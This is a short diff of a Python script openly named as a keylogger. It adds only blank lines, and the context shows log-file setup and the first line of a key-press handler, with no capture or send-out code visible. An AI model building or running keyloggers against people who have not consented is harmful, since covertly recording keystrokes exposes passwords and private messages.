@@ -6,12 +6,14 @@ from datetime import datetime
 now = datetime.now()
 now = (now.strftime("%Y-%m-%d %H:%M"))
 
+
 #creating and opening file
 with open("logger_result.txt" , "a") as file:
     file.write(f"key loger file at {now} is named {now}_Keylogger_data \n")
 
 with open(f"{now}_Keylogger_data" , "w") as file:
     file.write(" ")
+
 
 #function triggers when a key is pressed
 def pressed(key):
